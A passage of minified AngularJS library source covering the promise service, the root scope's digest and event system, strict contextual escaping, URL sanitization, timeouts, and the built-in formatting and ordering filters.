a||null==b?a===b:"object"===typeof a&&(a=pc(a),"object"===typeof a)?!1:a===b||a!==a&&b!==b}function g(a,b,c,d,f){var g=d.inputs,h;if(1===g.length){var k=e,g=g[0];return a.$watch(function(a){var b=g(a);e(b,k)||(h=d(a,void 0,void 0,[b]),k=b&&pc(b));return h},b,c,f)}for(var l=[],m=[],n=0,I=g.length;n<I;n++)l[n]=e,m[n]=null;return a.$watch(function(a){for(var b=!1,c=0,f=g.length;c<f;c++){var k=g[c](a);if(b||(b=!e(k,l[c])))m[c]=k,l[c]=k&&pc(k)}b&&(h=d(a,void 0,void 0,m));return h},b,c,f)}function h(a,
b,c,d,e){function f(a){return d(a)}function h(a,c,d){l=a;y(b)&&b(a,c,d);v(a)&&d.$$postDigest(function(){v(l)&&k()})}var k,l;return k=d.inputs?g(a,h,c,d,e):a.$watch(f,h,c)}function k(a,b,c,d){function e(a){var b=!0;q(a,function(a){v(a)||(b=!1)});return b}var f,g;return f=a.$watch(function(a){return d(a)},function(a,c,d){g=a;y(b)&&b(a,c,d);e(a)&&d.$$postDigest(function(){e(g)&&f()})},c)}function l(a,b,c,d){var e=a.$watch(function(a){e();return d(a)},b,c);return e}function m(a,b){if(!b)return a;var c=
a.$$watchDelegate,d=!1,c=c!==k&&c!==h?function(c,e,f,g){f=d&&g?g[0]:a(c,e,f,g);return b(f,c,e)}:function(c,d,e,f){e=a(c,d,e,f);c=b(e,c,d);return v(e)?c:e},d=!a.inputs;a.$$watchDelegate&&a.$$watchDelegate!==g?(c.$$watchDelegate=a.$$watchDelegate,c.inputs=a.inputs):b.$stateful||(c.$$watchDelegate=g,c.inputs=a.inputs?a.inputs:[a]);return c}var n={csp:za().noUnsafeEval,literals:Fa(b),isIdentifierStart:y(d)&&d,isIdentifierContinue:y(c)&&c};return function(b,c){var d,e,u;switch(typeof b){case "string":return u=
b=b.trim(),d=a[u],d||(":"===b.charAt(0)&&":"===b.charAt(1)&&(e=!0,b=b.substring(2)),d=new qc(n),d=(new rc(d,f,n)).parse(b),d.constant?d.$$watchDelegate=l:e?d.$$watchDelegate=d.literal?k:h:d.inputs&&(d.$$watchDelegate=g),a[u]=d),m(d,c);case "function":return m(b,c);default:return m(w,c)}}}]}function If(){var a=!0;this.$get=["$rootScope","$exceptionHandler",function(b,d){return Fd(function(a){b.$evalAsync(a)},d,a)}];this.errorOnUnhandledRejections=function(b){return v(b)?(a=b,this):a}}function Jf(){var a=
!0;this.$get=["$browser","$exceptionHandler",function(b,d){return Fd(function(a){b.defer(a)},d,a)}];this.errorOnUnhandledRejections=function(b){return v(b)?(a=b,this):a}}function Fd(a,b,d){function c(){return new f}function f(){var a=this.promise=new e;this.resolve=function(b){k(a,b)};this.reject=function(b){m(a,b)};this.notify=function(b){p(a,b)}}function e(){this.$$state={status:0}}function g(){for(;!v&&t.length;){var a=t.shift();if(!a.pur){a.pur=!0;var c=a.value,c="Possibly unhandled rejection: "+
("function"===typeof c?c.toString().replace(/ \{[\s\S]*$/,""):x(c)?"undefined":"string"!==typeof c?we(c):c);a.value instanceof Error?b(a.value,c):b(c)}}}function h(b){!d||b.pending||2!==b.status||b.pur||(0===v&&0===t.length&&a(g),t.push(b));!b.processScheduled&&b.pending&&(b.processScheduled=!0,++v,a(function(){var c,e,f;f=b.pending;b.processScheduled=!1;b.pending=void 0;try{for(var h=0,l=f.length;h<l;++h){b.pur=!0;e=f[h][0];c=f[h][b.status];try{y(c)?k(e,c(b.value)):1===b.status?k(e,b.value):m(e,
b.value)}catch(n){m(e,n)}}}finally{--v,d&&0===v&&a(g)}}))}function k(a,b){a.$$state.status||(b===a?n(a,H("qcycle",b)):l(a,b))}function l(a,b){function c(b){g||(g=!0,l(a,b))}function d(b){g||(g=!0,n(a,b))}function e(b){p(a,b)}var f,g=!1;try{if(F(b)||y(b))f=b.then;y(f)?(a.$$state.status=-1,f.call(b,c,d,e)):(a.$$state.value=b,a.$$state.status=1,h(a.$$state))}catch(k){d(k)}}function m(a,b){a.$$state.status||n(a,b)}function n(a,b){a.$$state.value=b;a.$$state.status=2;h(a.$$state)}function p(c,d){var e=
c.$$state.pending;0>=c.$$state.status&&e&&e.length&&a(function(){for(var a,c,f=0,g=e.length;f<g;f++){c=e[f][0];a=e[f][3];try{p(c,y(a)?a(d):d)}catch(h){b(h)}}})}function r(a){var b=new e;m(b,a);return b}function J(a,b,c){var d=null;try{y(c)&&(d=c())}catch(e){return r(e)}return d&&y(d.then)?d.then(function(){return b(a)},r):b(a)}function s(a,b,c,d){var f=new e;k(f,a);return f.then(b,c,d)}function u(a){if(!y(a))throw H("norslvr",a);var b=new e;a(function(a){k(b,a)},function(a){m(b,a)});return b}var H=
M("$q",TypeError),v=0,t=[];R(e.prototype,{then:function(a,b,c){if(x(a)&&x(b)&&x(c))return this;var d=new e;this.$$state.pending=this.$$state.pending||[];this.$$state.pending.push([d,a,b,c]);0<this.$$state.status&&h(this.$$state);return d},"catch":function(a){return this.then(null,a)},"finally":function(a,b){return this.then(function(b){return J(b,w,a)},function(b){return J(b,r,a)},b)}});var w=s;u.prototype=e.prototype;u.defer=c;u.reject=r;u.when=s;u.resolve=w;u.all=function(a){var b=new e,c=0,d=C(a)?
[]:{};q(a,function(a,e){c++;s(a).then(function(a){d[e]=a;--c||k(b,d)},function(a){m(b,a)})});0===c&&k(b,d);return b};u.race=function(a){var b=c();q(a,function(a){s(a).then(b.resolve,b.reject)});return b.promise};return u}function Sf(){this.$get=["$window","$timeout",function(a,b){var d=a.requestAnimationFrame||a.webkitRequestAnimationFrame,c=a.cancelAnimationFrame||a.webkitCancelAnimationFrame||a.webkitCancelRequestAnimationFrame,f=!!d,e=f?function(a){var b=d(a);return function(){c(b)}}:function(a){var c=
b(a,16.66,!1);return function(){b.cancel(c)}};e.supported=f;return e}]}function Hf(){function a(a){function b(){this.$$watchers=this.$$nextSibling=this.$$childHead=this.$$childTail=null;this.$$listeners={};this.$$listenerCount={};this.$$watchersCount=0;this.$id=++rb;this.$$ChildScope=null}b.prototype=a;return b}var b=10,d=M("$rootScope"),c=null,f=null;this.digestTtl=function(a){arguments.length&&(b=a);return b};this.$get=["$exceptionHandler","$parse","$browser",function(e,g,h){function k(a){a.currentScope.$$destroyed=
!0}function l(a){9===La&&(a.$$childHead&&l(a.$$childHead),a.$$nextSibling&&l(a.$$nextSibling));a.$parent=a.$$nextSibling=a.$$prevSibling=a.$$childHead=a.$$childTail=a.$root=a.$$watchers=null}function m(){this.$id=++rb;this.$$phase=this.$parent=this.$$watchers=this.$$nextSibling=this.$$prevSibling=this.$$childHead=this.$$childTail=null;this.$root=this;this.$$destroyed=!1;this.$$listeners={};this.$$listenerCount={};this.$$watchersCount=0;this.$$isolateBindings=null}function n(a){if(H.$$phase)throw d("inprog",
H.$$phase);H.$$phase=a}function p(a,b){do a.$$watchersCount+=b;while(a=a.$parent)}function r(a,b,c){do a.$$listenerCount[c]-=b,0===a.$$listenerCount[c]&&delete a.$$listenerCount[c];while(a=a.$parent)}function J(){}function s(){for(;ia.length;)try{ia.shift()()}catch(a){e(a)}f=null}function u(){null===f&&(f=h.defer(function(){H.$apply(s)}))}m.prototype={constructor:m,$new:function(b,c){var d;c=c||this;b?(d=new m,d.$root=this.$root):(this.$$ChildScope||(this.$$ChildScope=a(this)),d=new this.$$ChildScope);
d.$parent=c;d.$$prevSibling=c.$$childTail;c.$$childHead?(c.$$childTail.$$nextSibling=d,c.$$childTail=d):c.$$childHead=c.$$childTail=d;(b||c!==this)&&d.$on("$destroy",k);return d},$watch:function(a,b,d,e){var f=g(a);if(f.$$watchDelegate)return f.$$watchDelegate(this,b,d,f,a);var h=this,k=h.$$watchers,l={fn:b,last:J,get:f,exp:e||a,eq:!!d};c=null;y(b)||(l.fn=w);k||(k=h.$$watchers=[],k.$$digestWatchIndex=-1);k.unshift(l);k.$$digestWatchIndex++;p(this,1);return function(){var a=$a(k,l);0<=a&&(p(h,-1),
a<k.$$digestWatchIndex&&k.$$digestWatchIndex--);c=null}},$watchGroup:function(a,b){function c(){h=!1;k?(k=!1,b(e,e,g)):b(e,d,g)}var d=Array(a.length),e=Array(a.length),f=[],g=this,h=!1,k=!0;if(!a.length){var l=!0;g.$evalAsync(function(){l&&b(e,e,g)});return function(){l=!1}}if(1===a.length)return this.$watch(a[0],function(a,c,f){e[0]=a;d[0]=c;b(e,a===c?e:d,f)});q(a,function(a,b){var k=g.$watch(a,function(a,f){e[b]=a;d[b]=f;h||(h=!0,g.$evalAsync(c))});f.push(k)});return function(){for(;f.length;)f.shift()()}},
$watchCollection:function(a,b){function c(a){e=a;var b,d,g,h;if(!x(e)){if(F(e))if(ta(e))for(f!==n&&(f=n,u=f.length=0,l++),a=e.length,u!==a&&(l++,f.length=u=a),b=0;b<a;b++)h=f[b],g=e[b],d=h!==h&&g!==g,d||h===g||(l++,f[b]=g);else{f!==p&&(f=p={},u=0,l++);a=0;for(b in e)va.call(e,b)&&(a++,g=e[b],h=f[b],b in f?(d=h!==h&&g!==g,d||h===g||(l++,f[b]=g)):(u++,f[b]=g,l++));if(u>a)for(b in l++,f)va.call(e,b)||(u--,delete f[b])}else f!==e&&(f=e,l++);return l}}c.$stateful=!0;var d=this,e,f,h,k=1<b.length,l=0,m=
g(a,c),n=[],p={},r=!0,u=0;return this.$watch(m,function(){r?(r=!1,b(e,e,d)):b(e,h,d);if(k)if(F(e))if(ta(e)){h=Array(e.length);for(var a=0;a<e.length;a++)h[a]=e[a]}else for(a in h={},e)va.call(e,a)&&(h[a]=e[a]);else h=e})},$digest:function(){var a,g,k,l,m,p,r,u=b,q,w=[],x,ia;n("$digest");h.$$checkUrlChange();this===H&&null!==f&&(h.defer.cancel(f),s());c=null;do{r=!1;q=this;for(p=0;p<v.length;p++){try{ia=v[p],ia.scope.$eval(ia.expression,ia.locals)}catch(z){e(z)}c=null}v.length=0;a:do{if(p=q.$$watchers)for(p.$$digestWatchIndex=
p.length;p.$$digestWatchIndex--;)try{if(a=p[p.$$digestWatchIndex])if(m=a.get,(g=m(q))!==(k=a.last)&&!(a.eq?qa(g,k):ga(g)&&ga(k)))r=!0,c=a,a.last=a.eq?Fa(g,null):g,l=a.fn,l(g,k===J?g:k,q),5>u&&(x=4-u,w[x]||(w[x]=[]),w[x].push({msg:y(a.exp)?"fn: "+(a.exp.name||a.exp.toString()):a.exp,newVal:g,oldVal:k}));else if(a===c){r=!1;break a}}catch(D){e(D)}if(!(p=q.$$watchersCount&&q.$$childHead||q!==this&&q.$$nextSibling))for(;q!==this&&!(p=q.$$nextSibling);)q=q.$parent}while(q=p);if((r||v.length)&&!u--)throw H.$$phase=
null,d("infdig",b,w);}while(r||v.length);for(H.$$phase=null;A<t.length;)try{t[A++]()}catch(E){e(E)}t.length=A=0},$destroy:function(){if(!this.$$destroyed){var a=this.$parent;this.$broadcast("$destroy");this.$$destroyed=!0;this===H&&h.$$applicationDestroyed();p(this,-this.$$watchersCount);for(var b in this.$$listenerCount)r(this,this.$$listenerCount[b],b);a&&a.$$childHead===this&&(a.$$childHead=this.$$nextSibling);a&&a.$$childTail===this&&(a.$$childTail=this.$$prevSibling);this.$$prevSibling&&(this.$$prevSibling.$$nextSibling=
this.$$nextSibling);this.$$nextSibling&&(this.$$nextSibling.$$prevSibling=this.$$prevSibling);this.$destroy=this.$digest=this.$apply=this.$evalAsync=this.$applyAsync=w;this.$on=this.$watch=this.$watchGroup=function(){return w};this.$$listeners={};this.$$nextSibling=null;l(this)}},$eval:function(a,b){return g(a)(this,b)},$evalAsync:function(a,b){H.$$phase||v.length||h.defer(function(){v.length&&H.$digest()});v.push({scope:this,expression:g(a),locals:b})},$$postDigest:function(a){t.push(a)},$apply:function(a){try{n("$apply");
try{return this.$eval(a)}finally{H.$$phase=null}}catch(b){e(b)}finally{try{H.$digest()}catch(c){throw e(c),c;}}},$applyAsync:function(a){function b(){c.$eval(a)}var c=this;a&&ia.push(b);a=g(a);u()},$on:function(a,b){var c=this.$$listeners[a];c||(this.$$listeners[a]=c=[]);c.push(b);var d=this;do d.$$listenerCount[a]||(d.$$listenerCount[a]=0),d.$$listenerCount[a]++;while(d=d.$parent);var e=this;return function(){var d=c.indexOf(b);-1!==d&&(c[d]=null,r(e,1,a))}},$emit:function(a,b){var c=[],d,f=this,
g=!1,h={name:a,targetScope:f,stopPropagation:function(){g=!0},preventDefault:function(){h.defaultPrevented=!0},defaultPrevented:!1},k=ab([h],arguments,1),l,m;do{d=f.$$listeners[a]||c;h.currentScope=f;l=0;for(m=d.length;l<m;l++)if(d[l])try{d[l].apply(null,k)}catch(n){e(n)}else d.splice(l,1),l--,m--;if(g)return h.currentScope=null,h;f=f.$parent}while(f);h.currentScope=null;return h},$broadcast:function(a,b){var c=this,d=this,f={name:a,targetScope:this,preventDefault:function(){f.defaultPrevented=!0},
defaultPrevented:!1};if(!this.$$listenerCount[a])return f;for(var g=ab([f],arguments,1),h,k;c=d;){f.currentScope=c;d=c.$$listeners[a]||[];h=0;for(k=d.length;h<k;h++)if(d[h])try{d[h].apply(null,g)}catch(l){e(l)}else d.splice(h,1),h--,k--;if(!(d=c.$$listenerCount[a]&&c.$$childHead||c!==this&&c.$$nextSibling))for(;c!==this&&!(d=c.$$nextSibling);)c=c.$parent}f.currentScope=null;return f}};var H=new m,v=H.$$asyncQueue=[],t=H.$$postDigestQueue=[],ia=H.$$applyAsyncQueue=[],A=0;return H}]}function ze(){var a=
/^\s*(https?|ftp|mailto|tel|file):/,b=/^\s*((https?|ftp|file|blob):|data:image\/)/;this.aHrefSanitizationWhitelist=function(b){return v(b)?(a=b,this):a};this.imgSrcSanitizationWhitelist=function(a){return v(a)?(b=a,this):b};this.$get=function(){return function(d,c){var f=c?b:a,e;e=Da(d).href;return""===e||e.match(f)?d:"unsafe:"+e}}}function xg(a){if("self"===a)return a;if(E(a)){if(-1<a.indexOf("***"))throw ua("iwcard",a);a=Gd(a).replace(/\\\*\\\*/g,".*").replace(/\\\*/g,"[^:/.?&;]*");return new RegExp("^"+
a+"$")}if(Xa(a))return new RegExp("^"+a.source+"$");throw ua("imatcher");}function Hd(a){var b=[];v(a)&&q(a,function(a){b.push(xg(a))});return b}function Lf(){this.SCE_CONTEXTS=pa;var a=["self"],b=[];this.resourceUrlWhitelist=function(b){arguments.length&&(a=Hd(b));return a};this.resourceUrlBlacklist=function(a){arguments.length&&(b=Hd(a));return b};this.$get=["$injector",function(d){function c(a,b){return"self"===a?sd(b):!!a.exec(b.href)}function f(a){var b=function(a){this.$$unwrapTrustedValue=
function(){return a}};a&&(b.prototype=new a);b.prototype.valueOf=function(){return this.$$unwrapTrustedValue()};b.prototype.toString=function(){return this.$$unwrapTrustedValue().toString()};return b}var e=function(a){throw ua("unsafe");};d.has("$sanitize")&&(e=d.get("$sanitize"));var g=f(),h={};h[pa.HTML]=f(g);h[pa.CSS]=f(g);h[pa.URL]=f(g);h[pa.JS]=f(g);h[pa.RESOURCE_URL]=f(h[pa.URL]);return{trustAs:function(a,b){var c=h.hasOwnProperty(a)?h[a]:null;if(!c)throw ua("icontext",a,b);if(null===b||x(b)||
""===b)return b;if("string"!==typeof b)throw ua("itype",a);return new c(b)},getTrusted:function(d,f){if(null===f||x(f)||""===f)return f;var g=h.hasOwnProperty(d)?h[d]:null;if(g&&f instanceof g)return f.$$unwrapTrustedValue();if(d===pa.RESOURCE_URL){var g=Da(f.toString()),n,p,r=!1;n=0;for(p=a.length;n<p;n++)if(c(a[n],g)){r=!0;break}if(r)for(n=0,p=b.length;n<p;n++)if(c(b[n],g)){r=!1;break}if(r)return f;throw ua("insecurl",f.toString());}if(d===pa.HTML)return e(f);throw ua("unsafe");},valueOf:function(a){return a instanceof
g?a.$$unwrapTrustedValue():a}}}]}function Kf(){var a=!0;this.enabled=function(b){arguments.length&&(a=!!b);return a};this.$get=["$parse","$sceDelegate",function(b,d){if(a&&8>La)throw ua("iequirks");var c=ra(pa);c.isEnabled=function(){return a};c.trustAs=d.trustAs;c.getTrusted=d.getTrusted;c.valueOf=d.valueOf;a||(c.trustAs=c.getTrusted=function(a,b){return b},c.valueOf=Ya);c.parseAs=function(a,d){var e=b(d);return e.literal&&e.constant?e:b(d,function(b){return c.getTrusted(a,b)})};var f=c.parseAs,
e=c.getTrusted,g=c.trustAs;q(pa,function(a,b){var d=P(b);c[("parse_as_"+d).replace(sc,gb)]=function(b){return f(a,b)};c[("get_trusted_"+d).replace(sc,gb)]=function(b){return e(a,b)};c[("trust_as_"+d).replace(sc,gb)]=function(b){return g(a,b)}});return c}]}function Mf(){this.$get=["$window","$document",function(a,b){var d={},c=!(a.chrome&&(a.chrome.app&&a.chrome.app.runtime||!a.chrome.app&&a.chrome.runtime&&a.chrome.runtime.id))&&a.history&&a.history.pushState,f=Z((/android (\d+)/.exec(P((a.navigator||
{}).userAgent))||[])[1]),e=/Boxee/i.test((a.navigator||{}).userAgent),g=b[0]||{},h=g.body&&g.body.style,k=!1,l=!1;h&&(k=!!("transition"in h||"webkitTransition"in h),l=!!("animation"in h||"webkitAnimation"in h));return{history:!(!c||4>f||e),hasEvent:function(a){if("input"===a&&La)return!1;if(x(d[a])){var b=g.createElement("div");d[a]="on"+a in b}return d[a]},csp:za(),transitions:k,animations:l,android:f}}]}function Of(){var a;this.httpOptions=function(b){return b?(a=b,this):a};this.$get=["$exceptionHandler",
"$templateCache","$http","$q","$sce",function(b,d,c,f,e){function g(h,k){g.totalPendingRequests++;if(!E(h)||x(d.get(h)))h=e.getTrustedResourceUrl(h);var l=c.defaults&&c.defaults.transformResponse;C(l)?l=l.filter(function(a){return a!==jc}):l===jc&&(l=null);return c.get(h,R({cache:d,transformResponse:l},a)).finally(function(){g.totalPendingRequests--}).then(function(a){d.put(h,a.data);return a.data},function(a){k||(a=yg("tpload",h,a.status,a.statusText),b(a));return f.reject(a)})}g.totalPendingRequests=
0;return g}]}function Pf(){this.$get=["$rootScope","$browser","$location",function(a,b,d){return{findBindings:function(a,b,d){a=a.getElementsByClassName("ng-binding");var g=[];q(a,function(a){var c=$.element(a).data("$binding");c&&q(c,function(c){d?(new RegExp("(^|\\s)"+Gd(b)+"(\\s|\\||$)")).test(c)&&g.push(a):-1!==c.indexOf(b)&&g.push(a)})});return g},findModels:function(a,b,d){for(var g=["ng-","data-ng-","ng\\:"],h=0;h<g.length;++h){var k=a.querySelectorAll("["+g[h]+"model"+(d?"=":"*=")+'"'+b+'"]');
if(k.length)return k}},getLocation:function(){return d.url()},setLocation:function(b){b!==d.url()&&(d.url(b),a.$digest())},whenStable:function(a){b.notifyWhenNoOutstandingRequests(a)}}}]}function Qf(){this.$get=["$rootScope","$browser","$q","$$q","$exceptionHandler",function(a,b,d,c,f){function e(e,k,l){y(e)||(l=k,k=e,e=w);var m=wa.call(arguments,3),n=v(l)&&!l,p=(n?c:d).defer(),r=p.promise,q;q=b.defer(function(){try{p.resolve(e.apply(null,m))}catch(b){p.reject(b),f(b)}finally{delete g[r.$$timeoutId]}n||
a.$apply()},k);r.$$timeoutId=q;g[q]=p;return r}var g={};e.cancel=function(a){return a&&a.$$timeoutId in g?(g[a.$$timeoutId].promise.catch(w),g[a.$$timeoutId].reject("canceled"),delete g[a.$$timeoutId],b.defer.cancel(a.$$timeoutId)):!1};return e}]}function Da(a){La&&(ca.setAttribute("href",a),a=ca.href);ca.setAttribute("href",a);return{href:ca.href,protocol:ca.protocol?ca.protocol.replace(/:$/,""):"",host:ca.host,search:ca.search?ca.search.replace(/^\?/,""):"",hash:ca.hash?ca.hash.replace(/^#/,""):
"",hostname:ca.hostname,port:ca.port,pathname:"/"===ca.pathname.charAt(0)?ca.pathname:"/"+ca.pathname}}function sd(a){a=E(a)?Da(a):a;return a.protocol===Id.protocol&&a.host===Id.host}function Rf(){this.$get=ma(z)}function Jd(a){function b(a){try{return decodeURIComponent(a)}catch(b){return a}}var d=a[0]||{},c={},f="";return function(){var a,g,h,k,l;try{a=d.cookie||""}catch(m){a=""}if(a!==f)for(f=a,a=f.split("; "),c={},h=0;h<a.length;h++)g=a[h],k=g.indexOf("="),0<k&&(l=b(g.substring(0,k)),x(c[l])&&
(c[l]=b(g.substring(k+1))));return c}}function Vf(){this.$get=Jd}function Xc(a){function b(d,c){if(F(d)){var f={};q(d,function(a,c){f[c]=b(c,a)});return f}return a.factory(d+"Filter",c)}this.register=b;this.$get=["$injector",function(a){return function(b){return a.get(b+"Filter")}}];b("currency",Kd);b("date",Ld);b("filter",zg);b("json",Ag);b("limitTo",Bg);b("lowercase",Cg);b("number",Md);b("orderBy",Nd);b("uppercase",Dg)}function zg(){return function(a,b,d,c){if(!ta(a)){if(null==a)return a;throw M("filter")("notarray",
a);}c=c||"$";var f;switch(tc(b)){case "function":break;case "boolean":case "null":case "number":case "string":f=!0;case "object":b=Eg(b,d,c,f);break;default:return a}return Array.prototype.filter.call(a,b)}}function Eg(a,b,d,c){var f=F(a)&&d in a;!0===b?b=qa:y(b)||(b=function(a,b){if(x(a))return!1;if(null===a||null===b)return a===b;if(F(b)||F(a)&&!Vb(a))return!1;a=P(""+a);b=P(""+b);return-1!==a.indexOf(b)});return function(e){return f&&!F(e)?Ha(e,a[d],b,d,!1):Ha(e,a,b,d,c)}}function Ha(a,b,d,c,f,
e){var g=tc(a),h=tc(b);if("string"===h&&"!"===b.charAt(0))return!Ha(a,b.substring(1),d,c,f);if(C(a))return a.some(function(a){return Ha(a,b,d,c,f)});switch(g){case "object":var k;if(f){for(k in a)if("$"!==k.charAt(0)&&Ha(a[k],b,d,c,!0))return!0;return e?!1:Ha(a,b,d,c,!1)}if("object"===h){for(k in b)if(e=b[k],!y(e)&&!x(e)&&(g=k===c,!Ha(g?a:a[k],e,d,c,g,g)))return!1;return!0}return d(a,b);case "function":return!1;default:return d(a,b)}}function tc(a){return null===a?"null":typeof a}function Kd(a){var b=
a.NUMBER_FORMATS;return function(a,c,f){x(c)&&(c=b.CURRENCY_SYM);x(f)&&(f=b.PATTERNS[1].maxFrac);return null==a?a:Od(a,b.PATTERNS[1],b.GROUP_SEP,b.DECIMAL_SEP,f).replace(/\u00A4/g,c)}}function Md(a){var b=a.NUMBER_FORMATS;return function(a,c){return null==a?a:Od(a,b.PATTERNS[0],b.GROUP_SEP,b.DECIMAL_SEP,c)}}function Fg(a){var b=0,d,c,f,e,g;-1<(c=a.indexOf(Pd))&&(a=a.replace(Pd,""));0<(f=a.search(/e/i))?(0>c&&(c=f),c+=+a.slice(f+1),a=a.substring(0,f)):0>c&&(c=a.length);for(f=0;a.charAt(f)===uc;f++);
if(f===(g=a.length))d=[0],c=1;else{for(g--;a.charAt(g)===uc;)g--;c-=f;d=[];for(e=0;f<=g;f++,e++)d[e]=+a.charAt(f)}c>Qd&&(d=d.splice(0,Qd-1),b=c-1,c=1);return{d:d,e:b,i:c}}function Gg(a,b,d,c){var f=a.d,e=f.length-a.i;b=x(b)?Math.min(Math.max(d,e),c):+b;d=b+a.i;c=f[d];if(0<d){f.splice(Math.max(a.i,d));for(var g=d;g<f.length;g++)f[g]=0}else for(e=Math.max(0,e),a.i=1,f.length=Math.max(1,d=b+1),f[0]=0,g=1;g<d;g++)f[g]=0;if(5<=c)if(0>d-1){for(c=0;c>d;c--)f.unshift(0),a.i++;f.unshift(1);a.i++}else f[d-
1]++;for(;e<Math.max(0,b);e++)f.push(0);if(b=f.reduceRight(function(a,b,c,d){b+=a;d[c]=b%10;return Math.floor(b/10)},0))f.unshift(b),a.i++}function Od(a,b,d,c,f){if(!E(a)&&!Y(a)||isNaN(a))return"";var e=!isFinite(a),g=!1,h=Math.abs(a)+"",k="";if(e)k="\u221e";else{g=Fg(h);Gg(g,f,b.minFrac,b.maxFrac);k=g.d;h=g.i;f=g.e;e=[];for(g=k.reduce(function(a,b){return a&&!b},!0);0>h;)k.unshift(0),h++;0<h?e=k.splice(h,k.length):(e=k,k=[0]);h=[];for(k.length>=b.lgSize&&h.unshift(k.splice(-b.lgSize,k.length).join(""));k.length>
b.gSize;)h.unshift(k.splice(-b.gSize,k.length).join(""));k.length&&h.unshift(k.join(""));k=h.join(d);e.length&&(k+=c+e.join(""));f&&(k+="e+"+f)}return 0>a&&!g?b.negPre+k+b.negSuf:b.posPre+k+b.posSuf}function Kb(a,b,d,c){var f="";if(0>a||c&&0>=a)c?a=-a+1:(a=-a,f="-");for(a=""+a;a.length<b;)a=uc+a;d&&(a=a.substr(a.length-b));return f+a}function aa(a,b,d,c,f){d=d||0;return function(e){e=e["get"+a]();if(0<d||e>-d)e+=d;0===e&&-12===d&&(e=12);return Kb(e,b,c,f)}}function nb(a,b,d){return function(c,f){var e=
c["get"+a](),g=vb((d?"STANDALONE":"")+(b?"SHORT":"")+a);return f[g][e]}}function Rd(a){var b=(new Date(a,0,1)).getDay();return new Date(a,0,(4>=b?5:12)-b)}function Sd(a){return function(b){var d=Rd(b.getFullYear());b=+new Date(b.getFullYear(),b.getMonth(),b.getDate()+(4-b.getDay()))-+d;b=1+Math.round(b/6048E5);return Kb(b,a)}}function vc(a,b){return 0>=a.getFullYear()?b.ERAS[0]:b.ERAS[1]}function Ld(a){function b(a){var b;if(b=a.match(d)){a=new Date(0);var e=0,g=0,h=b[8]?a.setUTCFullYear:a.setFullYear,
k=b[8]?a.setUTCHours:a.setHours;b[9]&&(e=Z(b[9]+b[10]),g=Z(b[9]+b[11]));h.call(a,Z(b[1]),Z(b[2])-1,Z(b[3]));e=Z(b[4]||0)-e;g=Z(b[5]||0)-g;h=Z(b[6]||0);b=Math.round(1E3*parseFloat("0."+(b[7]||0)));k.call(a,e,g,h,b)}return a}var d=/^(\d{4})-?(\d\d)-?(\d\d)(?:T(\d\d)(?::?(\d\d)(?::?(\d\d)(?:\.(\d+))?)?)?(Z|([+-])(\d\d):?(\d\d))?)?$/;return function(c,d,e){var g="",h=[],k,l;d=d||"mediumDate";d=a.DATETIME_FORMATS[d]||d;E(c)&&(c=Hg.test(c)?Z(c):b(c));Y(c)&&(c=new Date(c));if(!fa(c)||!isFinite(c.getTime()))return c;
for(;d;)(l=Ig.exec(d))?(h=ab(h,l,1),d=h.pop()):(h.push(d),d=null);var m=c.getTimezoneOffset();e&&(m=Jc(e,m),c=Wb(c,e,!0));q(h,function(b){k=Jg[b];g+=k?k(c,a.DATETIME_FORMATS,m):"''"===b?"'":b.replace(/(^'|'$)/g,"").replace(/''/g,"'")});return g}}function Ag(){return function(a,b){x(b)&&(b=2);return cb(a,b)}}function Bg(){return function(a,b,d){b=Infinity===Math.abs(Number(b))?Number(b):Z(b);if(ga(b))return a;Y(a)&&(a=a.toString());if(!ta(a))return a;d=!d||isNaN(d)?0:Z(d);d=0>d?Math.max(0,a.length+
d):d;return 0<=b?wc(a,d,d+b):0===d?wc(a,b,a.length):wc(a,Math.max(0,d+b),d)}}function wc(a,b,d){return E(a)?a.slice(b,d):wa.call(a,b,d)}function Nd(a){function b(b){return b.map(function(b){var c=1,d=Ya;if(y(b))d=b;else if(E(b)){if("+"===b.charAt(0)||"-"===b.charAt(0))c="-"===b.charAt(0)?-1:1,b=b.substring(1);if(""!==b&&(d=a(b),d.constant))var f=d(),d=function(a){return a[f]}}return{get:d,descending:c}})}function d(a){switch(typeof a){case "number":case "boolean":case "string":return!0;default:return!1}}
function c(a,b){var c=0,d=a.type,k=b.type;if(d===k){var k=a.value,l=b.value;"string"===d?(k=k.toLowerCase(),l=l.toLowerCase()):"object"===d&&(F(k)&&(k=a.index),F(l)&&(l=b.index));k!==l&&(c=k<l?-1:1)}else c=d<k?-1:1;return c}return function(a,e,g,h){if(null==a)return a;if(!ta(a))throw M("orderBy")("notarray",a);C(e)||(e=[e]);0===e.length&&(e=["+"]);var k=b(e),l=g?-1:1,m=y(h)?h:c;a=Array.prototype.map.call(a,function(a,b){return{value:a,tieBreaker:{value:b,type:"number",index:b},predicateValues:k.map(function(c){var e=
c.get(a);c=typeof e;if(null===e)c="string",e="null";else if("object"===c)a:{if(y(e.valueOf)&&(e=e.valueOf(),d(e)))break a;Vb(e)&&(e=e.toString(),d(e))}return{value:e,type:c,index:b}})}});a.sort(function(a,b){for(var c=0,d=k.length;c<d;c++){var e=m(a.predicateValues[c],b.predicateValues[c]);if(e)return e*k[c].descending*l}return m(a.tieBreaker,b.tieBreaker)*l});return a=a.map(function(a){return a.value})}}function Ra(a){y(a)&&(a={link:a});a.restrict=a.restrict||"AC";return ma(a)}function Lb(a,b,d,
c,f){this.$$controls=[];this.$error={};this.$$success={};this.$pending=void 0;this.$name=f(b.name||b.ngForm||"")(d);this.$dirty=!1;this.$valid=this.$pristine=!0;this.$submitted=this.$invalid=!1;this.$$parentForm=Mb;this.$$element=a;this.$$animate=c;Td(this)}function Td(a){a.$$classCache={};a.$$classCache[Ud]=!(a.$$classCache[ob]=a.$$element.hasClass(ob))}function Vd(a){function b(a,b,c){c&&!a.$$classCache[b]?(a.$$animate.addClass(a.$$element,b),a.$$classCache[b]=!0):!c&&a.$$classCache[b]&&(a.$$animate.removeClass(a.$$element,
b),a.$$classCache[b]=!1)}function d(a,c,d){c=c?"-"+Nc(c,"-"):"";b(a,ob+c,!0===d);b(a,Ud+c,!1===d)}var c=a.set,f=a.unset;a.clazz.prototype.$setValidity=function(a,g,h){x(g)?(this.$pending||(this.$pending={}),c(this.$pending,a,h)):(this.$pending&&f(this.$pending,a,h),Wd(this.$pending)&&(this.$pending=void 0));Ia(g)?g?(f(this.$error,a,h),c(this.$$success,a,h)):(c(this.$error,a,h),f(this.$$success,a,h)):(f(this.$error,a,h),f(this.$$success,a,h));this.$pending?(b(this,"ng-pending",!0),this.$valid=this.$invalid=
